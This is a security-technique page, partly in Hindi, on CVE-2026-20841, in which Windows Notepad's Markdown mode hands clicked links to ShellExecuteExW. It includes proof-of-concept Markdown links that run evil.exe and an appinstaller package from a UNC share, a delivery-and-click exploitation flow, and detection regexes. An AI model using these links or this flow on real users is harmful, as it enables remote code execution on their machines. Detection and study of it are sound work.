# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Modern Windows applications that render Markdown/HTML अक्सर user-supplied links को clickable elements में बदल देती हैं और उन्हें `ShellExecuteExW` को दे देती हैं। कड़े scheme allowlisting के बिना, कोई भी registered protocol handler (उदा., `file:`, `ms-appinstaller:`) ट्रिगर हो सकता है, जिससे वर्तमान उपयोगकर्ता संदर्भ में code execution हो सकता है।

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad केवल **`.md` extensions`** के लिए Markdown mode चुनता है, यह एक fixed string comparison के जरिए `sub_1400ED5D0()` में होता है।
- Supported Markdown links:
- Standard: `[text](target)`
- Autolink: `<target>` (rendered as `[target](target)`), इसलिए दोनों syntaxes payloads और detections के लिए मायने रखते हैं।
- Link clicks को `sub_140170F60()` में process किया जाता है, जो कमजोर filtering करता है और फिर `ShellExecuteExW` को call करता है।
- `ShellExecuteExW` किसी भी **configured protocol handler** को dispatch करता है, केवल HTTP(S) तक सीमित नहीं।

### Payload considerations
- Link में किसी भी `\\` sequences को `ShellExecuteExW` को कॉल करने से पहले **normalized to `\`** किया जाता है, जो UNC/path crafting और detection को प्रभावित करता है।
- `.md` files default रूप से Notepad के साथ **associated नहीं होते**; victim को अभी भी फाइल Notepad में खोलनी होगी और link पर क्लिक करना होगा, लेकिन एक बार render हो जाने पर link clickable होता है।
- Dangerous example schemes:
- `file://` — स्थानीय/UNC payload लॉन्च करने के लिए।
- `ms-appinstaller://` — App Installer flows को trigger करने के लिए। अन्य locally registered schemes भी abusable हो सकते हैं।

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Exploitation flow
1. Craft a **`.md` file** so Notepad renders it as Markdown.
2. Embed a link using a dangerous URI scheme (`file:`, `ms-appinstaller:`, or any installed handler).
3. Deliver the file (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB or similar) and convince the user to open it in Notepad.
4. On click, the **सामान्यीकृत लिंक** is handed to `ShellExecuteExW` and the corresponding protocol handler executes the referenced content in the user’s context.

## Detection ideas
- Monitor transfers of `.md` files over ports/protocols that commonly deliver documents: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Parse Markdown links (standard and autolink) and look for **case-insensitive** `file:` or `ms-appinstaller:`.
- Vendor-guided regexes to catch remote resource access:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- पैच के व्यवहार के अनुसार रिपोर्ट है कि यह **allowlists local files and HTTP(S)**; `ShellExecuteExW` तक पहुँचने वाली कोई भी अन्य चीज़ संदिग्ध है। सिस्टम के अनुसार attack surface बदलता है, इसलिए आवश्यकतानुसार detections को अन्य installed protocol handlers पर बढ़ाएँ।

## References
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
